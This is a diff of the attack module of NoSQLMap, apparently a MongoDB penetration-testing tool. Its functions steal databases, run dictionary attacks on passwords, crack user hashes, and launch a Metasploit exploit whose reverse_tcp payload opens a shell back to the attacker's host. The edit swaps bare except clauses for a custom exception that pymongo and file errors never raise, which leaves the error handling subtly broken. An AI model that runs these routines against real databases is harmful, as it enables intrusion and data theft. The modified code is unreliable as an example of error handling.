@@ -2,6 +2,7 @@
 # NoSQLMap Copyright 2012-2017 NoSQLMap Development team
 # See the file 'doc/COPYING' for copying permission
 
+from exception import NoSQLMapException
 import pymongo
 import urllib
 import json
@@ -49,7 +50,7 @@ def netAttacks(target, dbPort, myIP, myPort, args = None):
             conn = pymongo.MongoClient(target)
             print "MongoDB authenticated on " + target + ":27017!"
             mgtOpen = True
-        except:
+        except NoSQLMapException:
             raw_input("Failed to authenticate.  Press enter to continue...")
             return
 
@@ -91,7 +92,7 @@ def netAttacks(target, dbPort, myIP, myPort, args = None):
                 print "REST interface not enabled."
             print "\n"
 
-    except Exception, e:
+    except NoSQLMapException:
         print "MongoDB web management closed or requires authentication."
 
     if mgtOpen == True:
@@ -180,7 +181,7 @@ def stealDBs(myDB,victim,mongoConn):
         else:
             return
 
-    except Exception, e:
+    except NoSQLMapException, e:
         if str(e).find('text search not enabled') != -1:
             raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
             return
@@ -231,7 +232,7 @@ def dict_pass(user,key):
             with open (dictionary) as f:
                    passList = f.readlines()
             loadCheck = True
-        except:
+        except NoSQLMapException:
             print " Couldn't load file."
 
     print "Running dictionary attack..."
@@ -303,7 +304,7 @@ def enumDbs (mongoConn):
         print "\n".join(mongoConn.database_names())
         print "\n"
 
-    except:
+    except NoSQLMapException:
         print "Error:  Couldn't list databases.  The provided credentials may not have rights."
 
     print "List of collections:"
@@ -328,7 +329,7 @@ def enumDbs (mongoConn):
                     if crack in yes_tag:
                         passCrack(users[x]['user'],users[x]['pwd'])
 
-    except Exception, e:
+    except NoSQLMapException, e:
         print e
         print "Error:  Couldn't list collections.  The provided credentials may not have rights."
 
@@ -336,11 +337,11 @@ def enumDbs (mongoConn):
     return
 
 
-def msfLaunch():
+def msfLaunch(victim, myIP, myPort):
     try:
         proc = subprocess.call(["msfcli", "exploit/linux/misc/mongod_native_helper", "RHOST=%s" % victim, "DB=local", "PAYLOAD=linux/x86/shell/reverse_tcp", "LHOST=%s" % myIP, "LPORT=%s" % myPort, "E"])
 
-    except:
+    except NoSQLMapException:
         print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
     raw_input("Press enter to continue...")
     return
@@ -357,10 +358,10 @@ def enumGrid (mongoConn):
                 print " list of files:"
                 print "\n".join(files)
 
-            except:
+            except NoSQLMapException:
                 print "GridFS not enabled on " + str(dbItem) + "."
 
-    except:
+    except NoSQLMapException:
         print "Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights."
 
     return
@@ -381,7 +382,7 @@ def mongoScan(ip,port,pingIt):
                     conn.close()
                     return [0,dbVer]
 
-                except:
+                except NoSQLMapException:
                     if str(sys.exc_info()).find('need to login') != -1:
                         conn.close()
                         return [1,None]
@@ -390,7 +391,7 @@ def mongoScan(ip,port,pingIt):
                         conn.close()
                         return [2,None]
 
-            except:
+            except NoSQLMapException:
                 return [3,None]
 
         else:
@@ -405,7 +406,7 @@ def mongoScan(ip,port,pingIt):
                 conn.close()
                 return [0,dbVer]
 
-            except Exception, e:
+            except NoSQLMapException, e:
                 if str(e).find('need to login') != -1:
                     conn.close()
                     return [1,None]
@@ -414,5 +415,5 @@ def mongoScan(ip,port,pingIt):
                     conn.close()
                     return [2,None]
 
-        except:
+        except NoSQLMapException:
             return [3,None]
